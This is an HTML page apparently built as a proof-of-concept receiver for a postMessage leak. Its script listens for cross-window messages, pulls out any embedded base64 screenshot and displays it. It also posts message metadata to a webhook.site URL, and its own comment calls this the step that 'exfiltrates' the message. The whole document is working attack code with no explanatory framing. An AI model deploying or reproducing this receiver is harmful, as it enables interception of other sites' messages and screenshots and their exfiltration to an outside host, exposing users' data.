<!DOCTYPE html>
<html>
  <body>
    <h1>Receiver Loaded</h1>
    <script>
      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace with your real one

      function deepFindScreenshot(obj) {
        const str = JSON.stringify(obj);
        const match = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
        return match ? match[0] : null;
      }

      window.addEventListener("message", (e) => {
        try {
          const data = e.data;
          const screenshot = deepFindScreenshot(data);

          // Immediately exfiltrate the entire message
          fetch(webhookURL, {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify({
              timestamp: new Date().toISOString(),
              screenshot: screenshot ? "[REDACTED_IMAGE]" : null,
              messageKeys: Object.keys(data || {}),
              messageSize: JSON.stringify(data).length
            })
          });

          if (screenshot) {
            const img = new Image();
            img.src = screenshot;
            img.style.maxWidth = "300px";
            img.style.border = "2px solid red";
            document.body.appendChild(img);
            console.log("‚úÖ Screenshot captured and rendered.");
          } else {
            console.log("üì¶ Message received ‚Äî no screenshot found.");
          }

        } catch (err) {
          console.error("‚ö†Ô∏è Error in receiver:", err);
        }
      }, false);
    </script>
  </body>
</html>
